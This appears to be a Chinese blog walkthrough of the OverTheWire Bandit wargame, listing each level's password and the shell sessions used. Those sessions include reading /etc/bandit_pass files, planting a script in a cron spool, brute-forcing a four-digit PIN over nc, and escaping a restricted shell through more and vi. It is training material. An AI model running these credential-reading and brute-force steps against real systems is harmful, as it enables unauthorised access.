\n```\n此时光标会在第二行等待，监听命令没有执行完毕退出。\n我们在第二个终端中，我们来看看他所说的这个程序：\n```bash\nbandit20@bandit:~$ ll\ntotal 28\ndrwxr-xr-x  2 root     root     4096 Nov 13 15:58 ./\ndrwxr-xr-x 29 root     root     4096 Nov 13 15:57 ../\n-rw-r--r--  1 root     root      220 Sep  1  2015 .bash_logout\n-rw-r--r--  1 root     root     3771 Sep  1  2015 .bashrc\n-rw-r--r--  1 root     root      655 Jun 24  2016 .profile\n-rwsr-x---  1 bandit21 bandit20 8044 Nov 13 15:58 suconnect*\nbandit20@bandit:~$ ./suconnect \nUsage: ./suconnect <portnumber>\nThis program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.\n# 嗯 上面的报道基本没什么偏差…… 我们来运行一下，端口号是我们上面自定义的监听端口「23333」\nbandit20@bandit:~$ ./suconnect 23333\nRead: GbKksEFF4yrVs6il55v6gwY5aVje5f0j\nPassword matches, sending next password\n# 程序告诉我们，他读到了我们发送给他的密码「GbKksEFF4yrVs6il55v6gwY5aVje5f0j」，密码抱对成功，下一关的密码已发送。\n```\n那我们再来看一眼监听的那一边：\n```bash\nbandit20@bandit:~$ nc -l 23333 < /etc/bandit_pass/bandit20 # 这条是我们之前的\ngE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr #收到了密码\nbandit20@bandit:~$ # 出现了它，表示 nc 命令结束了执行。\n```\n\n### 思路二：\n这个思路其实我之前叙述的时候已经透露出一些味道了，细心的应该已经不用我说了。\n关键词「&」。\n这道题创建两个终端去连接的根本原因是因为监听和执行会占用两个终端，那我们把监听扔到后台去跑不就解决了吗。\n连接姿势为正常姿势不多说……算了还是多说个j8（图）吧：\n![IMAGE](/Image/bandit_resources/7BBE68BB3C0BC4EC581DB35ABD35E039.jpg)\n\n```bash\n# 放在后台执行\nbandit20@bandit:~$ nc -l 23333 < /etc/bandit_pass/bandit20 & \n# 后台运行进程代号[1]，PID 为 1135 \n[1] 1135\nbandit20@bandit:~$ ./suconnect 23333\nRead: GbKksEFF4yrVs6il55v6gwY5aVje5f0j\nPassword matches, sending next password\n# 后台进程返回了得到的信息（密码）到标准输出（你当前的终端）\ngE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr\n# 后台进程运行结束，命令为：nc -l 23333 < /etc/bandit_pass/bandit20\n[1]+  Done                    nc -l 23333 < /etc/bandit_pass/bandit20\nbandit20@bandit:~$ \n```\n\n心路历程：嗯，先说思路一的理由是我怕我先写思路二，再写的思路一可能没人看了。\n\nLevel 21 - 22\n\n描述：一个程序从cron（基于时间的作业调度程序）定期自动运行。查看/etc/cron.d/中的配置并查看正在执行的命令。\n\n密码：Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI\n\n```sh\n# 进入描述中的文件夹\nbandit21@bandit:~$ cd /etc/cron.d/\nbandit21@bandit:/etc/cron.d$ ll\ntotal 28\ndrwxr-xr-x   2 root root 4096 Nov 13 15:58 ./\ndrwxr-xr-x 101 root root 4096 Nov 13 15:58 ../\n-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder\n-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit22\n-rw-r--r--   1 root root  122 Nov 13 15:58 cronjob_bandit23\n-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit24\n-rw-r--r--   1 root root  190 Oct 31 13:21 popularity-contest\n# 不要问我为什么，就是直觉\nbandit21@bandit:/etc/cron.d$ cat cronjob_bandit22\n@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null\n* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null\n# 他会跑这个脚本，那我们去看看\nbandit21@bandit:/etc/cron.d$ cat -n /usr/bin/cronjob_bandit22.sh\n     1  #!/bin/bash\n     2  chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv\n     3  cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv\n# 他会往这个脚本里跑内容\nbandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv\nYk7owGAcWjwMVRwrTesJEwB7WVOiILLI\n```\n\n心路历程：甚至不需要知道他所说的 cron 是干什么的，我们就能找到密码（当然，游戏放水也有很大因素）。不过该知道的还是要知道的，cron 是 Linux 的守护进程。通俗一点就是我们平时接触到的计划任务，按照规定时间安排定期执行动作的。其中的 cronjob\\_bandit\\* 就是提供给 cron 执行的文件。「\\* \\* \\* \\* \\* bandit22 /usr/bin/cronjob\\_bandit22.sh &\\> /dev/null」前面的「\\*」是每分钟执行一次，「bandit22」是用它的身份执行，「/usr/bin/cronjob\\_bandit22.sh」是被执行脚本，至于「&\\> /dev/null」 前面都有分别提到过，不说任性。\n\n---\n\nLevel 22 - 23\n\n描述：一个程序从cron（基于时间的作业调度程序）定期自动运行。查看/etc/cron.d/中的配置并查看正在执行的命令。 注意：查看其他人编写的shell脚本是非常有用的技巧。这个级别的脚本是故意易于阅读。如果您在理解它的功能时遇到问题，请尝试执行它以查看打印的调试信息。\n\n密码：jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n\n\n```sh\nbandit22@bandit:~$ ll /etc/cron.d\ntotal 28\ndrwxr-xr-x   2 root root 4096 Nov 13 15:58 ./\ndrwxr-xr-x 101 root root 4096 Nov 13 15:58 ../\n-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder\n-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit22\n-rw-r--r--   1 root root  122 Nov 13 15:58 cronjob_bandit23\n-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit24\n-rw-r--r--   1 root root  190 Oct 31 13:21 popularity-contest\nbandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23\n@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null\n* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null\nbandit22@bandit:~$ cat -n /usr/bin/cronjob_bandit23.sh\n     1  #!/bin/bash\n     2\n     3  myname=$(whoami)\n     4  mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)\n     5\n     6  echo \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\"\n     7\n     8  cat /etc/bandit_pass/$myname > /tmp/$mytarget\n\ncat /etc/bandit_pass/$myname > /tmp/$mytarget\nbandit22@bandit:~$ myname=\"bandit23\"\nbandit22@bandit:~$ mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)\nbandit22@bandit:~$ echo \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\"\nCopying passwordfile /etc/bandit_pass/bandit23 to /tmp/8ca319486bfbbc3663ea0fbe81326349\nbandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349\njc1udXuA1tiHqjIsL8yaapX5XIAI6i0n\n```\n\n心路历程：这里的定位思路与上一关没什么区别，最后会要你分析这个简单的代码。因为 cronjob\\_bandit23 文件中指定的用户是 bandit23，whoami 的结果也是这个，我们就直接赋值然后走流程就行了。\n\n---\n\nLevel 23 -24\n\n描述：一个程序从cron（基于时间的作业调度程序）定期自动运行。查看/etc/cron.d/中的配置并查看正在执行的命令。 \n\n注意：这个级别要求你创建你自己的第一个shell脚本。这是非常大的一步，当你击败这个级别时，你应该为自己感到骄傲！ \n\n注意2：请记住，你的shell脚本一旦执行就会被删除，所以你可能想保留一个副本...\n\n密码：UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ\n\n```sh\nbandit23@bandit:/var/spool/bandit24$ ll /etc/cron.d\ntotal 28\ndrwxr-xr-x   2 root root 4096 Nov 13 15:58 ./\ndrwxr-xr-x 101 root root 4096 Nov 16 10:18 ../\n-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder\n-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit22\n-rw-r--r--   1 root root  122 Nov 13 15:58 cronjob_bandit23\n-rw-r--r--   1 root root  120 Nov 13 15:58 cronjob_bandit24\n-rw-r--r--   1 root root  190 Oct 31 13:21 popularity-contest\nbandit23@bandit:/var/spool/bandit24$ cat /etc/cron.d/cronjob_bandit24\n@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null\n* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null\nbandit23@bandit:/var/spool/bandit24$ cat -n /usr/bin/cronjob_bandit24.sh\n     1  #!/bin/bash\n     2\n     3  myname=$(whoami)\n     4\n     5  cd /var/spool/$myname\n     6  echo \"Executing and deleting all scripts in /var/spool/$myname:\"\n     7  for i in * .*;\n     8  do\n     9      if [ \"$i\" != \".\" -a \"$i\" != \"..\" ];\n    10      then\n    11          echo \"Handling $i\"\n    12          timeout -s 9 60 ./$i\n    13          rm -f ./$i\n    14      fi\n    15  done\nbandit23@bandit:/var/spool/bandit24$ echo \"cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass\" > /var/spool/bandit24/bandit24_getpwd ; chmod 777 bandit24_getpwd ; chmod 777 /tmp/bandit24_pass\nbandit23@bandit:/var/spool/bandit24$ cat chmod 777 /tmp/bandit24_pass\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ\n```\n\n心路历程：我们定位脚本的思路不变，看脚本发现：该脚本会执行 `/var/spool/bandit24` 的脚本，60s 如果还没之行结束会强制kill掉，然后删除。所以我们写了一个把 `/etc/bandit\\_pass/bandit24/` 输出到 /tmp/bandit24\\_pass 的脚本到这个目录下，然后付了个权限。\n\n---\n\nLevel 24 - 25\n\n描述：一个守护进程正在监听端口30002，如果给出了bandit24的密码和一个秘密的数字4位pincode，将给你bandit25的密码。没有办法检索pincode，除非枚举10000个组合，称为蛮力。\n\n密码：uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG\n\n```sh\nbandit24@bandit:~$ vim /tmp/boom.py\nbandit24@bandit:~$ cat -n /tmp/boom.py\n     1  #!/usr/bin/env python\n     2\n     3  fl = open('/tmp/boom_dict.txt', 'w+')\n     4  pwd = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'\n     5  for i in xrange(10000):\n     6      fl.write(pwd + ' ' + str(i).zfill(4) + '\\n')\n     7  fl.close()\n     8\nbandit24@bandit:~$ python /tmp/boom.py\nbandit24@bandit:~$ head /tmp/boom_dict.txt\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0002\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0003\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0004\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0005\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0006\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0007\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0008\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0009\nbandit24@bandit:~$ nc localhost 30002 < /tmp/boom_dict.txt > /tmp/reply_pwd.txt\nbandit24@bandit:~$ sort /tmp/reply_pwd.txt | uniq -u\n\nCorrect!\nExiting.\nI am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.\nThe password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG\n```\n\n心路历程：这关描述也很清晰（虽然我是机翻）。它开放了一个 30002 端口监听，你给他发 bandit24 的密码 +空格 + 四位数字，如果这个字符串正确它就会返回给你 bandit25 的密码。 Bandit24 的密码我们很容易得到，那问题就是这个4位数了。描述中说我们只能尝试暴力破解，那就从「0001」到「9999」都生成出来，分别与 bandit24的密码+空格连接，把这一万个组合都试一下。于是写了一个 python 脚本生成这个含有 10000 种组合的文件，并提交给 30002 端口，把返回的信息存放在文件中，然后筛选文件内正确信息。\n\n---\n\nLevel 25 - 26\n\n描述：从bandit25登录到bandit26应该相当简单...用户bandit26的shell不是/ bin / bash，而是别的。找出它是什么，它是如何工作的，以及如何摆脱它。\n\n密码：5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z\n\n```bash\nbandit25@bandit:~$ ls\nbandit26.sshkey\nbandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost        \nCould not create directory '/home/bandit25/.ssh'.\nThe authenticity of host 'localhost (127.0.0.1)' can't be established.\nECDSA key fingerprint is SHA256:rm2/oZ03et2au9vHBOtBNdgMDGJkbNqdkmHDLPDD32E.\nAre you sure you want to continue connecting (yes/no)? yes\n | |                   | (_) | |__ \\ / /  \n | |__   __ _ _ __   __| |_| |_   ) / /_  \n | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\ \n | |_) | (_| | | | | (_| | | |_ / /| (_) |\n |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ \nConnection to localhost closed.\nbandit25@bandit:~$  \n# ssh 连接以后把我提出来了。。。\n# 题目提示 bandit26 的 shell 不是 /bin/bash，那我们看看是什么\nbandit25@bandit:~$ cat /etc/passwd | grep bandit26\nbandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext\nbandit25@bandit:~$ cat -n /usr/bin/showtext\n     1  #!/bin/sh\n     2\n     3  export TERM=linux\n     4\n     5  more ~/text.txt\n     6  exit 0\n# more 命令是一次显示一屏文字，然后左下角会显示一个 more 和当前显示了百分之多少\n# 我们在回头看看上面登陆后的字符画：\n# | |                   | (_) | |__ \\ / /  \n# | |__   __ _ _ __   __| |_| |_   ) / /_  \n# | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\ \n# | |_) | (_| | | | | (_| | | |_ / /| (_) |\n# |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ \n# 之前在其他登陆中不曾见过，想必就是 more 命令显示的 text.txt 的内容\n# 因为行数足以一屏显示完，所以没有显示 more 就没有显示\n# 我们的思路就在 more 的这个特点上。我们要让他卡在一屏读不完的位置，也就是让你的终端高度读不下6行（字符画高度）。\n# 这样我们可以在 more 的状态下通过一些特性执行命令找到我们下一关的密码。\n# 因为上面的字符画有6行，而使用 chrome 没办法变那么窄，我们转而使用系统的命令行 ssh 上去搞。\n```\n我们先连接上去\n![IMAGE](/Image/bandit_resources/9E633BCC3C0A9193B0E8E2C2B65731BA.jpg)\n然后我们使用 bandit25 这个用户带着 bandit26 的 privatekey 去连接 bandit26\n![IMAGE](/Image/bandit_resources/D9A392F2C38EC45B17ACAAB75A5E3890.jpg)\nmore 命令像预期一样输出一屏后等待我们的动作：\n![IMAGE](/Image/bandit_resources/E02BACB49695839AC213BC250033CBDE.jpg)\n我们看看手册，有没有能我们需要的东西：\n![IMAGE](/Image/bandit_resources/A821D5D2B3FBEF8E79E26DE69CA97891.jpg)\n这个v命令能让我们进入 vi 模式，虽然不常用 vi，但经常 vim 敲代码，经常使用「:sp」「:vsp」这种能打开其他文件的命令。\n我们再去看看 vi 的 man 手册：\n![IMAGE](/Image/bandit_resources/06367F7F7B9D0A55C16D0B51300F9A4B.jpg)\n看起来就是我们需要的命令，那我们去试试。\n在 more 的页面按v进入vi\n![IMAGE](/Image/bandit_resources/FDDCDF1F1AA31D4A681D965AB9B27E74.jpg)\n然后使用命令 `:ex! /etc/bandit_pass/bandit26` 打开我们需要的密码文件：\n![IMAGE](/Image/bandit_resources/DDF96BC0FFF6CC6F41E8694DBDC1CE1E.jpg)\n\n心路历程：这关很有意思，刚好 more 与 vi 这两个命令我都不常用，查阅文档与测试了一番。诸如登陆时候的字符画与 more 这种小细节，透过终端似乎能在看到设计者的：）\n\n---\n\nLevel 26 - 27\n\n描述：**这时候，27级还不存在**\n\n[Game Over]\n\n---\n\n嗯……游戏是结束了，我最后问一句：\n![IMAGE](/Image/bandit_resources/00023D502683EF1B4545C5273153F690.jpg)","source":"_posts/WarGame_Bandit.md","raw":"---\ntitle: 「WarGame 系列」 Bandit \ndate: 2017-11-17 21:29:00\nlayout: post\ncomments: true\nreward: true\ntags:\n    - Wargame\n    - Linux \n---\n这次安利一个游戏。\n```sh\n _                     _ _ _   \n| |__   __ _ _ __   __| (_) |_ \n| '_ \\ / _` | '_ \\ / _` | | __|\n| |_) | (_| | | | | (_| | | |_ \n|_.__/ \\__,_|_| |_|\\__,_|_|\\__|\n```\n游戏呢是给初学者设计的，新手刚好可以一边过关一边学习一些 Linux 的基本操作。\n先说说这个游戏怎么玩吧：\n我们这个游戏有27关，对应27对账号密码组合。开始的时候送我们一个第一关的账号密码：「bandit0」-「bandit0」。\n我们需要使用这个账号登陆服务器并找到「bandit1」的密码，然后使用得到的密码登陆「bandit1」，再找到「bandit2」的密码……\n\n咦，等一下，这游戏怎么有种……「你追我，如果你追到我，我就让你嘿嘿嘿」的感觉呢……\n<!--more-->\n然而通关以后冰冷的现实告诉我：  \n![](/Image/bandit_resources/27CB93E553A707C15C1AB4DCFA52EFBA.jpg)\n……\n\n游戏呢，是需要自己动手玩的，这篇文章只是记录了我的通关思路和过程，可以参考，但也别无脑拷。\n下面的通关记录是在玩游戏的过程中边玩边记录的，所以比较正经，想上车的同学可以下车了～\n前几关写的比较细，也是考虑到新手一上来就看不懂很闹心，然后又要浪费蛋白质，嗯你懂的：）\n\n如果有好的思路，欢迎留言。\n\n# Bandit 游戏规则\n强盗战争是针对绝对的初学者。它会教授需要能够玩其他战争游戏的基础知识。\n\n……（剩下不翻译了，懒～\n\n\n\nLevel 0 \n\n两种姿势：1.终端直接 ssh 。2.看下面\n\nChrome 插件 「Secure Shell」\n\n![](/Image/bandit_resources/851073B8A9CDFA81ECB4F7719C7BDA39.jpg)\n\n按上图配置好各项后按「Enter」或点击「连接」\n\n![](/Image/bandit_resources/608E268171D41C5563D62EA2F9F30FDE.jpg)\n\n输入页面中告诉我们的密码：bandit0\n\n（输入密码时是隐式输入，光标不会动，不要以为卡了，正常输入后按回车等待反馈信息就好）\n\n![](/Image/bandit_resources/BE3283D120238F44FADC24C8EA3F5CB8.jpg)\n\n见到这个东西就证明我们使用 SSH 连接服务器成功了。我们就可以用手中的这台电脑操作这台服务器了。\n\n---\nLevel 0 - 1\n\n描述：下一级别的密码存储在位于主目录中的名为readme的文件中。使用此密码 SSH 登录到bandit1。\n密码：boJ9jbbUNNfktd78OOpsqOltutMc3MY1\n\n```sh\nbandit0@bandit:~$ ls\nreadme\nbandit0@bandit:~$ cat readme\nboJ9jbbUNNfktd78OOpsqOltutMc3MY1\n```\n\n心路历程：借上图中的红框，「~」表明我们登陆后的当前位置是该用户的主目录，`ls` 列出当前目录下的文件，发现确实有这个「readme」文件。使用 `cat` 命令打印出文件的内容。\n拿到这个所谓的密码之后，我们要使用 exit 命令退出这次登陆（直接刷新网页更快～）。\n\n```sh\nbandit0@bandit:~$ exit \nlogout\nConnection to bandit.labs.overthewire.org closed.\nNaCl 插件已退出，状态代码为：0。\n重新连接(&R)、选择其他连接(&C)或退出(&E)\n```\n\n这时我们输入 C，然后配置新的连接，使用新的用户名「bandit1」和密码「boJ9jbbUNNfktd78OOpsqOltutMc3MY1」登陆就ok了。\n提示：如果大家不知道去哪里查找命令的话，可以在终端中 `man 命令`，例如 `man ls`。天生英文抗性为负的朋友可以来这里查👉[Linux 命令大全](http://man.linuxde.net/)，但并不能完全取代 man 手册。\n\n---\n\nLevel 1 - 2\n\n描述：下一级别的密码存储在一个名为 - 位于主目录中的文件中。\n\n密码：CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9\n\n```sh\nbandit1@bandit:~$ ls\n-\nbandit1@bandit:~$ cat ./-\nCV1DtqXWVFXTvM2F0k09SHz0YwRINYA9\n```\n\n心路历程：文件名是「-」，如果是其他名字直接 `cat filename` 就好了，然而如果是 `cat -` 的话，就有一些小问题，因为 bash 中会用「-」来接受命令行参数，未避免冲突，我们使用「./」来表示当前目录，那「-」文件就表示为「./-」。\n\n---\n\nLevel 2 - 3\n\n描述：下一级别的密码存储在位于主目录中的文件名含有「空格」的文件中\n\n密码：UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK\n\n```sh\nbandit2@bandit:~$ ls\nspaces in this filename\nbandit2@bandit:~$ ll\ntotal 28\ndrwxr-xr-x  3 bandit2 bandit2 4096 Nov 10 15:23 ./\ndrwxr-xr-x 30 root    root    4096 Nov 10 15:23 ../\n-rw-r--r--  1 bandit2 bandit2  220 Apr  9  2014 .bash_logout\n-rw-r--r--  1 bandit2 bandit2 3637 Apr  9  2014 .bashrc\ndrwx------  2 bandit2 bandit2 4096 Nov 10 15:23 .cache/\n-rw-r--r--  1 bandit2 bandit2  675 Apr  9  2014 .profile\n-rw-r-----  1 bandit3 bandit2   33 Sep 28 14:04 spaces in this filename\nbandit2@bandit:~$ cat spaces\\ in\\ this\\ filename \nUmHadQclWmgdLOKQ3YNgjWxGoRMb5luK\n```\n\n心路历程：这关使用 `ls` 后没办法确定文件的数量（1～4个），使用 `ll` 命令（`ls -alF`）查看一下发现是一个单独的文件（「.」开头的文件为隐藏文件，故之前没有显示）。这里的空格面临的情况跟之前的「-」差不多，避免混淆，使用「\\ 」（斜线后跟空格表示空格）。\n提示：`ll` 并不是 linux 的基本命令，而是「.bashrc」这个文件中的\n```bash\nalias ll='ls -alF'\n```\n这句话定义的。相当于对 `ls -alF` 这个命令起了一个别名。\n因为这个别名的定义较为普遍，所以我没看这个文件内容之前就习惯性的试了下。\n\n---\n\n\n\n```sh\nbandit3@bandit:~$ ls\ninhere\nbandit3@bandit:~$ cd inhere \nbandit3@bandit:~/inhere$ ls\nbandit3@bandit:~/inhere$ ll\ntotal 12\ndrwxr-xr-x 2 root    root    4096 Sep 28 14:04 ./\ndrwxr-xr-x 4 bandit3 bandit3 4096 Nov 10 15:42 ../\n-rw-r----- 1 bandit4 bandit3   33 Sep 28 14:04 .hidden\nbandit3@bandit:~/inhere$ cat .hidden \npIwrPrtPN36QITSp3EQaw936yaFoFgAB\n```\n\n心路历程：进入「inhere」目录后使用 `ls` 命令看不到非隐藏文件，我们使用 `ll` 就ok了。\n\n---\n\nLevel 4 -5\n\n描述：下一级别的密码存储在inhere目录中唯一的人类可读文件中。提示：如果你的终端搞砸了，试试“重置”命令。\n\n密码：koReBOKuIDDepwhWk7jZC0RTdopnAYKh\n\n```sh\nbandit4@bandit:~$ ls\ninhere\nbandit4@bandit:~$ cd inhere\nbandit4@bandit:~/inhere$ ls\n-file00  -file01  -file02  -file03  -file04  -file05  -file06  -file07  -file08  -file09\nbandit4@bandit:~/inhere$ file ./*\n./-file00: Non-ISO extended-ASCII text, with CR line terminators, with escape sequences\n./-file01: data\n./-file02: data\n./-file03: data\n./-file04: data\n./-file05: data\n./-file06: data\n./-file07: ASCII text\n./-file08: data\n./-file09: data\nbandit4@bandit:~/inhere$ cat ./-file07\nkoReBOKuIDDepwhWk7jZC0RTdopnAYKh\n```\n\n心路历程：因为描述中提到了这个文件是唯一人类可读的文件，大概率会与其他文件不太一样，我们选择使用 `file` 命令查看文件类型后发现只有一个 「ASCII text」文件，那基本就是它了。\n\n---\n\nLevel 5 - 6\n\n描述：下一级别的密码存储在inhere目录下的某个文件中，并具有以下所有属性： 人类可读，大小为1033字节，不可执行。\n\n密码：DXjZPULLxYr17uwoI01bNLQbtFemEgo7\n\n```sh\nbandit5@bandit:~$ ls\ninhere\nbandit5@bandit:~$ cd inhere; ll\ntotal 88\ndrwxr-x--- 22 root    bandit5 4096 Sep 28 14:04 ./\ndrwxr-xr-x  4 bandit5 bandit5 4096 Nov 11 06:01 ../\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere00/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere01/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere02/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere03/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere04/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere05/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere06/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere07/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere08/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere09/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere10/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere11/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere12/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere13/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere14/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere15/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere16/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere17/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere18/\ndrwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere19/\nbandit5@bandit:~/inhere$ find . -type f -size 1033c\n./maybehere07/.file2\nbandit5@bandit:~/inhere$ cat ./maybehere07/.file2\nDXjZPULLxYr17uwoI01bNLQbtFemEgo7\n```\n\n心路历程：第二个命令 `cd inhere; ll` 两个命令通过分号间隔，会分别执行。我们发现 inhere 目录下还有好多目录（文件夹）。这如果一个一个找就累死了。我们使用 `find` 命令查找一下。`-type f`指定文件类型为普通文件，`-size 1033c` 指定文件大小为 1033 bytes。具体可参考我上面给出的 [Linux 命令大全](http://man.linuxde.net/)\n提示：`ls -l` 后每行开头的字符串中第一个字母是「d」表示为「directory」- 目录。我们使用的 `ll` 在 .bashrc 文件中被定义为 `ls -alF` 其中 `a` 是显示隐藏文件， `l` 是详细信息， `F` 是每条后面追加文件类型标识符，我们输出的每行内容尾部都有的「／」就表示这些都是目录。\n\n---\n\nLevel 6 - 7\n\n描述：下一级别的密码存储在服务器的某个位置，具有以下所有属性： 所属用户bandit7，所属用户组bandit6，拥有 33个字节的大小\n\n密码：HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs\n\n```sh\nbandit6@bandit:~$ find / -group bandit6 -user bandit7 -size 33c 2>/dev/null\n/var/lib/dpkg/info/bandit7.password\nbandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password\nHKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs\n```\n\n心路历程：描述中说「存储在服务器的某个位置」，我们使用「／」这个 linux 根目录作为我们搜索的最顶层。其中我们还用到了 Linux 下的「黑洞」，把错误输入全扔了进去。这样就只返回了正确结果。\n如果把错误输出重定向到「黑洞」中，就是酱紫滴：  \n![IMAGE](/Image/bandit_resources/6672B54C1537E1423C2D857DA346FF5B.jpg)\n太多干扰信息不好观察。\n提示：「2>/dev/null」中「2」表示错误输出，「>」是重定向符号表示把信息送到哪里，「/dev/null」是「Linux黑洞」。这里有篇文章供参考👉[shell中>/dev/null 2>&1是什么鬼？](http://www.kissyu.org/2016/12/25/shell%E4%B8%AD%3E%20:dev:null%202%20%3E%20&1%E6%98%AF%E4%BB%80%E4%B9%88%E9%AC%BC%EF%BC%9F/)\n\n---\n\nLevel 7 - 8\n\n描述：下一级的密码存储文件data.txt中 “millionth” 的下一个单词。\n\n密码： cvX2JJa4CFALtqS87jk27qwqGhBM9plV\n\n```sh\nbandit7@bandit:~$ ll\ntotal 4112\ndrwxr-xr-x  3 bandit7 bandit7    4096 Nov 11 07:48 ./\ndrwxr-xr-x 30 root    root       4096 Nov 11 07:48 ../\n-rw-r--r--  1 bandit7 bandit7     220 Apr  9  2014 .bash_logout\n-rw-r--r--  1 bandit7 bandit7    3637 Apr  9  2014 .bashrc\ndrwx------  2 bandit7 bandit7    4096 Nov 11 07:48 .cache/\n-rw-r--r--  1 bandit7 bandit7     675 Apr  9  2014 .profile\n-rw-r-----  1 bandit8 bandit7 4184396 Sep 28 14:04 data.txt\nbandit7@bandit:~$ grep millionth data.txt\nmillionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV\n```\n\n心路历程：我们查看文件详细内容时发现这个文件比较大，光靠肉眼找是没戏了。所以我们借助命令 `grep` 找到 「milionth」这个单词所在行的内容，后面跟着下一关的密码。（其实最开始我惯性的`ls` 然后 `cat` 了一下……发觉不太对赶紧 `ctrl+c` 终止， `ll` 看了眼大小……）\n\n---\n\nLevel 8 - 9\n\n描述：下一个级别的密码存储在文件data.txt中，并且是仅出现一次的文本行。\n\n密码：UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR\n\n```sh\nbandit8@bandit:~$ ls\ndata.txt\nbandit8@bandit:~$ sort data.txt | uniq -u\nUsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR\n```\n\n心路历程：又描述得知这是一个文本文件，里面有很多行字符串，我们需要找到其中仅出现一次的行。使用 `sort` 命令对文件排序后再对其结果进行 `uniq -u` 只显示其中的单一行。\n提示：uniq -u 是上下相邻两行对比得到是否为单一行：\n```bash\nbandit8@bandit:~$ echo -en \"1\\n1\\n2\\n1\\n\" >test.txt\nbandit8@bandit:~$ cat test.txt \n1\n1\n2\n1\nbandit8@bandit:~$ uniq -u test.txt \n2\n1\n```\n如例子中的前两行被认定为重复行，第二行与第三行不同，第三行与第四行不同，所以「2」被当作了唯一行。第四行中的「1」同理。\n所以我们这里要先对文件排序：\n```bash\nbandit8@bandit:~$ sort test.txt > sorted.txt; cat sorted.txt\n1\n1\n1\n2\n```\n然后再筛选唯一行：\n```bash\nbandit8@bandit:~$ uniq -u sorted.txt\n2\n```\n\n---\n\nLevel 9 - 